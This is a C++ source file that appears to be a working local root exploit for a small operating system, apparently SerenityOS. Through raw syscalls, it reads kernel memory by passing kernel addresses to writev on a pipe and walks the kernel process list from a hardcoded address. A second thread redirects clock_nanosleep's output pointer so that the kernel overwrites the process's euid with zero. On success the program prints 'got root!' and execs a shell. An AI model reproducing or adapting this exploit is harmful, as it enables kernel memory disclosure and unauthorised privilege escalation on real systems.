using u32 = unsigned int;
using u16 = unsigned short;
using u8 = unsigned char;
using size_t = u32;
typedef u32 time_t;

#define ENUMERATE_SYSCALLS                          \
    __ENUMERATE_SYSCALL(sleep)                      \
    __ENUMERATE_SYSCALL(yield)                      \
    __ENUMERATE_SYSCALL(putch)                      \
    __ENUMERATE_SYSCALL(open)                       \
    __ENUMERATE_SYSCALL(close)                      \
    __ENUMERATE_SYSCALL(read)                       \
    __ENUMERATE_SYSCALL(lseek)                      \
    __ENUMERATE_SYSCALL(kill)                       \
    __ENUMERATE_SYSCALL(getuid)                     \
    __ENUMERATE_SYSCALL(exit)                       \
    __ENUMERATE_SYSCALL(getgid)                     \
    __ENUMERATE_SYSCALL(getpid)                     \
    __ENUMERATE_SYSCALL(waitpid)                    \
    __ENUMERATE_SYSCALL(mmap)                       \
    __ENUMERATE_SYSCALL(munmap)                     \
    __ENUMERATE_SYSCALL(get_dir_entries)            \
    __ENUMERATE_SYSCALL(lstat)                      \
    __ENUMERATE_SYSCALL(getcwd)                     \
    __ENUMERATE_SYSCALL(gettimeofday)               \
    __ENUMERATE_SYSCALL(gethostname)                \
    __ENUMERATE_SYSCALL(chdir)                      \
    __ENUMERATE_SYSCALL(uname)                      \
    __ENUMERATE_SYSCALL(set_mmap_name)              \
    __ENUMERATE_SYSCALL(readlink)                   \
    __ENUMERATE_SYSCALL(write)                      \
    __ENUMERATE_SYSCALL(ttyname_r)                  \
    __ENUMERATE_SYSCALL(stat)                       \
    __ENUMERATE_SYSCALL(getsid)                     \
    __ENUMERATE_SYSCALL(setsid)                     \
    __ENUMERATE_SYSCALL(getpgid)                    \
    __ENUMERATE_SYSCALL(setpgid)                    \
    __ENUMERATE_SYSCALL(getpgrp)                    \
    __ENUMERATE_SYSCALL(fork)                       \
    __ENUMERATE_SYSCALL(execve)                     \
    __ENUMERATE_SYSCALL(geteuid)                    \
    __ENUMERATE_SYSCALL(getegid)                    \
    __ENUMERATE_REMOVED_SYSCALL(isatty)             \
    __ENUMERATE_SYSCALL(getdtablesize)              \
    __ENUMERATE_SYSCALL(dup)                        \
    __ENUMERATE_SYSCALL(dup2)                       \
    __ENUMERATE_SYSCALL(sigaction)                  \
    __ENUMERATE_SYSCALL(getppid)                    \
    __ENUMERATE_SYSCALL(umask)                      \
    __ENUMERATE_SYSCALL(getgroups)                  \
    __ENUMERATE_SYSCALL(setgroups)                  \
    __ENUMERATE_SYSCALL(sigreturn)                  \
    __ENUMERATE_SYSCALL(sigprocmask)                \
    __ENUMERATE_SYSCALL(sigpending)                 \
    __ENUMERATE_SYSCALL(pipe)                       \
    __ENUMERATE_SYSCALL(killpg)                     \
    __ENUMERATE_SYSCALL(setuid)                     \
    __ENUMERATE_SYSCALL(setgid)                     \
    __ENUMERATE_SYSCALL(alarm)                      \
    __ENUMERATE_SYSCALL(fstat)                      \
    __ENUMERATE_SYSCALL(access)                     \
    __ENUMERATE_SYSCALL(fcntl)                      \
    __ENUMERATE_SYSCALL(ioctl)                      \
    __ENUMERATE_SYSCALL(mkdir)                      \
    __ENUMERATE_SYSCALL(times)                      \
    __ENUMERATE_SYSCALL(utime)                      \
    __ENUMERATE_SYSCALL(sync)                       \
    __ENUMERATE_SYSCALL(ptsname_r)                  \
    __ENUMERATE_SYSCALL(select)                     \
    __ENUMERATE_SYSCALL(unlink)                     \
    __ENUMERATE_SYSCALL(poll)                       \
    __ENUMERATE_SYSCALL(read_tsc)                   \
    __ENUMERATE_SYSCALL(rmdir)                      \
    __ENUMERATE_SYSCALL(chmod)                      \
    __ENUMERATE_SYSCALL(usleep)                     \
    __ENUMERATE_SYSCALL(socket)                     \
    __ENUMERATE_SYSCALL(bind)                       \
    __ENUMERATE_SYSCALL(accept)                     \
    __ENUMERATE_SYSCALL(listen)                     \
    __ENUMERATE_SYSCALL(connect)                    \
    __ENUMERATE_SYSCALL(create_shared_buffer)       \
    __ENUMERATE_SYSCALL(share_buffer_with)          \
    __ENUMERATE_SYSCALL(get_shared_buffer)          \
    __ENUMERATE_SYSCALL(release_shared_buffer)      \
    __ENUMERATE_SYSCALL(link)                       \
    __ENUMERATE_SYSCALL(chown)                      \
    __ENUMERATE_SYSCALL(fchmod)                     \
    __ENUMERATE_SYSCALL(symlink)                    \
    __ENUMERATE_SYSCALL(restore_signal_mask)        \
    __ENUMERATE_SYSCALL(get_shared_buffer_size)     \
    __ENUMERATE_SYSCALL(seal_shared_buffer)         \
    __ENUMERATE_SYSCALL(sendto)                     \
    __ENUMERATE_SYSCALL(recvfrom)                   \
    __ENUMERATE_SYSCALL(getsockopt)                 \
    __ENUMERATE_SYSCALL(setsockopt)                 \
    __ENUMERATE_SYSCALL(create_thread)              \
    __ENUMERATE_SYSCALL(gettid)                     \
    __ENUMERATE_SYSCALL(donate)                     \
    __ENUMERATE_SYSCALL(rename)                     \
    __ENUMERATE_SYSCALL(shm_open)                   \
    __ENUMERATE_SYSCALL(shm_unlink)                 \
    __ENUMERATE_SYSCALL(ftruncate)                  \
    __ENUMERATE_SYSCALL(systrace)                   \
    __ENUMERATE_SYSCALL(exit_thread)                \
    __ENUMERATE_SYSCALL(mknod)                      \
    __ENUMERATE_SYSCALL(writev)                     \
    __ENUMERATE_SYSCALL(beep)                       \
    __ENUMERATE_SYSCALL(getsockname)                \
    __ENUMERATE_SYSCALL(getpeername)                \
    __ENUMERATE_SYSCALL(sched_setparam)             \
    __ENUMERATE_SYSCALL(sched_getparam)             \
    __ENUMERATE_SYSCALL(fchown)                     \
    __ENUMERATE_SYSCALL(halt)                       \
    __ENUMERATE_SYSCALL(reboot)                     \
    __ENUMERATE_SYSCALL(mount)                      \
    __ENUMERATE_SYSCALL(umount)                     \
    __ENUMERATE_SYSCALL(dump_backtrace)             \
    __ENUMERATE_SYSCALL(dbgputch)                   \
    __ENUMERATE_SYSCALL(dbgputstr)                  \
    __ENUMERATE_SYSCALL(watch_file)                 \
    __ENUMERATE_SYSCALL(share_buffer_globally)      \
    __ENUMERATE_SYSCALL(set_process_icon)           \
    __ENUMERATE_SYSCALL(mprotect)                   \
    __ENUMERATE_SYSCALL(realpath)                   \
    __ENUMERATE_SYSCALL(get_process_name)           \
    __ENUMERATE_SYSCALL(fchdir)                     \
    __ENUMERATE_SYSCALL(getrandom)                  \
    __ENUMERATE_SYSCALL(setkeymap)                  \
    __ENUMERATE_SYSCALL(clock_gettime)              \
    __ENUMERATE_SYSCALL(clock_nanosleep)            \
    __ENUMERATE_SYSCALL(openat)                     \
    __ENUMERATE_SYSCALL(join_thread)                \
    __ENUMERATE_SYSCALL(module_load)                \
    __ENUMERATE_SYSCALL(module_unload)              \
    __ENUMERATE_SYSCALL(detach_thread)              \
    __ENUMERATE_SYSCALL(set_thread_name)            \
    __ENUMERATE_SYSCALL(get_thread_name)            \
    __ENUMERATE_SYSCALL(madvise)                    \
    __ENUMERATE_SYSCALL(purge)                      \
    __ENUMERATE_SYSCALL(set_shared_buffer_volatile) \
    __ENUMERATE_SYSCALL(profiling_enable)           \
    __ENUMERATE_SYSCALL(profiling_disable)          \
    __ENUMERATE_SYSCALL(get_kernel_info_page)       \
    __ENUMERATE_SYSCALL(futex)

enum X {
	SC_a, SC_b,
};

enum Function {
#define __ENUMERATE_SYSCALL(name) SC_##name,
#define __ENUMERATE_REMOVED_SYSCALL(name) SC_##name,
	ENUMERATE_SYSCALLS
#undef __ENUMERATE_SYSCALL
	__COUNT,
};

int __syscall(u32 a)
{
	u32 out;
	__asm__( "int $0x82" : "=a" (out) : "a" (a) : "memory");
	return out;
}

int __syscall(u32 a, u32 d)
{
	u32 out;
	__asm__( "int $0x82" : "=a" (out) : "a" (a), "d" (d) : "memory");
	return out;
}

int __syscall(u32 a, u32 d, u32 c)
{
	u32 out;
	__asm__( "int $0x82" : "=a" (out) : "a" (a), "d" (d), "c" (c) : "memory");
	return out;
}

int __syscall(u32 a, u32 d, u32 c, u32 b)
{
	u32 out;
	__asm__( "int $0x82" : "=a" (out) : "a" (a), "d" (d), "c" (c), "b" (b) : "memory");
	return out;
}

struct iovec {
	void *iov_base;
	size_t iov_len;
};

struct SC_create_thread_params {
    unsigned int m_detach_state = 0; // JOINABLE or DETACHED
    int m_schedule_priority = 2;     // ThreadPriority::Normal
    // FIXME: Implment guard pages in create_thread (unreadable pages at "overflow" end of stack)
    // "If an implementation rounds up the value of guardsize to a multiple of {PAGESIZE},
    // a call to pthread_attr_getguardsize() specifying attr shall store in the guardsize
    // parameter the guard size specified by the previous pthread_attr_setguardsize() function call"
    // ... ok, if you say so posix. Guess we get to lie to people about guard page size
    unsigned int m_guard_page_size = 0;          // Rounded up to PAGE_SIZE
    unsigned int m_reported_guard_page_size = 0; // The lie we tell callers
    unsigned int m_stack_size = 4 * 1024 * 1024;          // Default PTHREAD_STACK_MIN
    void* m_stack_location = nullptr;            // nullptr means any, o.w. process virtual address
};

template <typename... Args>
int syscall(u32 func, Args... args)
{
	return __syscall(func, (u32)args...);
}

static u32 axtoi(const char *p)
{
	u32 n = 0;
	int ch;
	while ((ch = *p++)) {
		if ((unsigned)(ch-'0') <= 9)
			n = n*16 + ch-'0';
		else
			n = n*16 + (ch|32)-'a' + 10;
	}
	return n;
}

static size_t strlen(const char *p)
{
	size_t n = 0;
	while (*p++)
		n += 1;
	return n;
}

static void __format(int fd, const char *s)
{
	syscall(SC_write, 1, s, strlen(s));
}

static void __format(int fd, u32 n)
{
	char s[10];
	s[0] = '0';
	s[1] = 'x';
	for (int i = 0; i < 8; i++)
		s[9-i] = "0123456789abcdef"[n&15], n >>= 4;
	syscall(SC_write, 1, s, 10);
}

static void format() { }
template <typename Arg, typename... Args>
static void format(Arg arg, Args... args)
{
	__format(1, arg);
	format(args...);
}

static void check(int ret, const char *what)
{
	if (ret < 0) {
		format("errno ", -ret, ": ", what, "\n");
	}
}

static void hexdump(const char *p, int n, u32 ofs=0)
{
	char line[16*2+16+16];
	while (n > 0) {
		format(ofs, " ");
		char *d = line;
		int m = 16;
		if (m > n)
			m = n;
		for (int i = 0; i < 16; i++) {
			if ((i&3) == 0)
				*d++ = ' ';
			if (i < m) {
				*d++ = "0123456789abcdef"[*p>>4&15];
				*d++ = "0123456789abcdef"[*p++&15];
			} else {
				*d++ = ' ';
				*d++ = ' ';
			}
		}
		*d++ = ' ';
		*d++ = ' ';
		p -= m;
		for (int i = 0; i < m; i++) {
			int ch = *p++;
			if (ch < 32 || ch > 0x7e)
				ch = '.';
			*d++ = ch;
		}
		*d++ = '\n';
		syscall(SC_write, 1, line, d-line);
		n -= m;
		ofs += m;
	}
}

#define info(...) format("[*] ", __VA_ARGS__, "\n")

//static char buffer[4096];
static int pipe_fd[2];

static void leak_mem(char *dest, u32 addr, u32 n)
{
	iovec iov { (void*)addr, n };

	u32 wn = syscall(SC_writev, pipe_fd[1], &iov, 1);
	info("writeved ", wn, " bytes from ", addr);
	u32 rn = syscall(SC_read, pipe_fd[0], dest, n);
	info("read ", rn, " bytes from pipe");
	//hexdump(buffer, rn);
}

template <typename T>
static void leak_mem(T *dest, u32 addr)
{ leak_mem((char*)dest, addr, sizeof(T)); }

struct T {
	static constexpr u32 g_processes = 0x0019f1c0;
};

struct timespec {
    time_t tv_sec;
    long tv_nsec;
};

struct SC_clock_nanosleep_params {
    int clock_id;
    int flags;
    const struct timespec* requested_sleep;
    struct timespec* remaining_sleep;
};

u32 addr_of_euid = 0;
u32 my_pid;

#define SIGINT 2
#define SIGCONT 18
static void *other_thread(void *arg) __attribute__((noreturn))
{
	info("other thread started");
	syscall(SC_sleep, 1);
	timespec **loc = (timespec**)arg;
	*loc = (timespec*)addr_of_euid;
	info("other thread woke up");
	syscall(SC_kill, my_pid, SIGCONT);
	syscall(SC_exit_thread, 0);
}

#define EINTR 4
extern "C" __attribute__((cdecl))
void _start(int argc, char **argv, char **environ)
{
	u32 addr = 0x10000;
	if (argc > 1)
		addr = axtoi(argv[1]);

	syscall(SC_write, 1, "Hello!\n", 7);

	int r = syscall(SC_pipe, pipe_fd, 0);
	check(r, "pipe");

	u32 ptr;
	leak_mem(&ptr, T::g_processes);
	info("ptr = ", (u32)ptr);
	leak_mem(&ptr, ptr);
	info("ptr = ", (u32)ptr);

	my_pid = syscall(SC_getpid);

	struct Process {
		char _pad[0x18];
		u32 prev;
		u32 next;
		u32 name_ptr;
		u32 pid;
		u32 uid;
		u32 gid;
		u32 euid;
		u32 egid;
	};

	for (int i = 0; i < 10; i++) {
		if (ptr < 0x1000)
			break;
		Process e;
		leak_mem(&e, ptr);
		hexdump((const char*)&e, sizeof e, ptr);
		info("Process::next = ", e.next);
		info("Process::pid = ", e.pid);
		info("Process::uid = ", e.uid);
		info("Process::gid = ", e.gid);
		if (e.pid == my_pid) {
			info("Found myself!");
			break;
		}
		ptr = e.next;
	}

	addr_of_euid = (u32)&((Process*)ptr)->euid;

	if (! syscall(SC_fork)) {
		info("other pid started");
		syscall(SC_sleep, 2);
		info("other pid woke up");
		syscall(SC_kill, my_pid, SIGCONT); // parent's pid, not ours
		syscall(SC_exit, 0);
	}

	timespec req, rem;
	req.tv_sec = 2;
	req.tv_nsec = 500*1000*1000;
	SC_clock_nanosleep_params nanosleep_param;
	nanosleep_param.clock_id = 1;
	nanosleep_param.flags = 0;
	nanosleep_param.requested_sleep = &req;
	nanosleep_param.remaining_sleep = &rem;
	SC_create_thread_params params;
	params.m_stack_size = 32*1024;
	params.m_stack_location = (void*)(((u32)&params - 64*1024)&~0xfff);
	info("about to create thread");
	u32 tid = syscall(SC_create_thread, other_thread, &nanosleep_param.remaining_sleep, &params);
	check(tid, "create_thread");
	int sleep_ret = syscall(SC_clock_nanosleep, &nanosleep_param);
	info("main thread woke up");
	if (sleep_ret != -EINTR) {
		info("failed to interrupt sleep");
	}

	u32 euid = syscall(SC_geteuid);
	info("my euid: ", euid);
	if (euid == 0) {
		info("\x1b[32mgot root!\x1b[0m");
		syscall(SC_setuid, 0);
		const char *argv[] = { "/bin/Shell", 0 };
		int r = syscall(SC_execve, argv[0], argv, environ);
		check(r, "execve");
	}

	syscall(SC_exit, 123);
}
